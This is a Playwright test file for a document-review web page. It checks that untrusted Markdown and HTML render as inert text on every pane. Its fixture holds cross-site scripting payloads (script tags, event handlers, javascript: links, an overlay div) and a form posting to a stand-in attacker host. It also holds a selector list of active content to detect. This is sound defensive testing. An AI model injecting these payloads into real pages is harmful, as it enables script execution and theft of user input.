import { expect, sampleDocument, section, serveDocument, test } from "./fixtures.ts";

const hostile = [
  "Reads **fine**.",
  "<script>window.__pwned = 'script'</script>",
  `<img src="x" onerror="window.__pwned = 'onerror'">`,
  "[markdown link](javascript:window.__pwned='markdown-link)",
  `<a href="javascript:window.__pwned='html-link'" onclick="window.__pwned='onclick'">html link</a>`,
  `<iframe src="/api/health"></iframe>`,
  `<div style="position:fixed;inset:0;z-index:99999" onclick="window.__pwned='overlay'">overlay</div>`,
  `<svg onload="window.__pwned = 'svg'"><a xlink:href="javascript:window.__pwned='svg-link'">svg link</a></svg>`,
  `<form action="https://attacker.example/steal"><input name="x"></form>`,
  `<object data="/api/health"></object>`,
  "[safe](https://example.com/docs)",
].join("\n\n");

/** The sample with hostile text where a generator writes Markdown. */
function hostileDocument() {
  const document = sampleDocument();
  document.summary.text = hostile;
  document.summary.release_note = hostile;
  const retry = section(document, "sec_retry");
  retry.summary.text = hostile;
  retry.risks[0]!.text = hostile;
  // Plain-text fields, which the page never parses.
  document.summary.title = `<img src=x onerror="window.__pwned='title'"> Title`;
  document.index.checks[0]!.name = `<script>window.__pwned='check'</script> check`;
  return document;
}

/** Everything that would be active content if it reached the page. */
const active = [
  "script",
  "iframe",
  "object",
  "embed",
  "form",
  "[onerror]",
  "[onclick]",
  "[onload]",
  'a[href^="javascript:" i]',
  '[href^="javascript:" i]',
  '[xlink\\:href^="javascript:" i]',
].join(", ");

test("untrusted Markdown and HTML renders as inert text on every pane that shows it", async ({
  page,
  browserErrors,
  foreignRequests,
}) => {
  await serveDocument(page, hostileDocument());

  // Served without the content security policy, which would stop every script
  // and handler by itself: here only the sanitizer stands in the way.
  for (const search of ["?csp=off", "?csp=off&pane=section&section=sec_retry"]) {
    await page.goto(`/${search}`);
    const pane = page.locator("#review-section");
    await expect(pane).toContainText("Reads fine.");

    // None of it reached the review pane as an element or an attribute.
    await expect(pane.locator(active)).toHaveCount(0);
    await expect(page.locator("body iframe, body object, body embed, body form")).toHaveCount(0);
    expect(await page.evaluate(() => Reflect.get(window, "__pwned"))).toBeUndefined();

    // Clicking what is left does nothing either: no overlay, no script link.
    await pane.getByText("html link").first().click({ force: true });
    await pane.getByText("markdown link").first().click({ force: true });
    await expect(page).toHaveURL(
      new RegExp(search.includes("pane=") ? "pane=section" : "^[^?]+\\?csp=off$"),
    );
    expect(await page.evaluate(() => Reflect.get(window, "__pwned"))).toBeUndefined();
  }

  // The same page, wherever the text was drawn, makes no request of its own to
  // anywhere else and raises no error.
  expect(foreignRequests).toEqual([]);
  expect(browserErrors).toEqual([]);
});

test("a safe link in untrusted Markdown opens in a new tab without a referrer", async ({
  page,
}) => {
  await serveDocument(page, hostileDocument());
  await page.goto("/");

  const link = page.locator("#review-section").getByRole("link", { name: "safe" }).first();

  await expect(link).toHaveAttribute("href", "https://example.com/docs");
  await expect(link).toHaveAttribute("target", "_blank");
  await expect(link).toHaveAttribute("rel", /noreferrer/);
});

test("fields that are plain text show markup as written", async ({ page }) => {
  await serveDocument(page, hostileDocument());
  await page.goto("/");

  const title = page.getByRole("heading", { level: 1 });
  await expect(title).toContainText(`<img src=x onerror="window.__pwned='title'"> Title`);
  await expect(title.locator("img")).toHaveCount(0);

  await page.getByRole("tab", { name: "Activity" }).click();
  await page.getByRole("tabpanel", { name: "Activity" }).getByText("6 checks on this head").click();
  await expect(page.getByRole("list", { name: "Checks on this head" })).toContainText(
    "<script>window.__pwned='check'</script> check",
  );
  expect(await page.evaluate(() => Reflect.get(window, "__pwned"))).toBeUndefined();
});

test("a code excerpt that contains markup is drawn as text", async ({ page }) => {
  const document = sampleDocument();
  const hunk = document.index.hunks.find((candidate) => candidate.id === "h_141757b19901")!;
  hunk.diff!.lines[0]!.text =
    `<img src=x onerror="window.__pwned='diff'"> // ${hunk.diff!.lines[0]!.text}`;
  await serveDocument(page, document);
  await page.goto("/?pane=section&section=sec_retry");

  const evidence = page
    .locator("#review-section")
    .getByRole("region", { name: "Behavior", exact: true })
    .locator("details")
    .first();
  await evidence.locator("summary").click();

  await expect(evidence.locator("img")).toHaveCount(0);
  expect(await page.evaluate(() => Reflect.get(window, "__pwned"))).toBeUndefined();
});
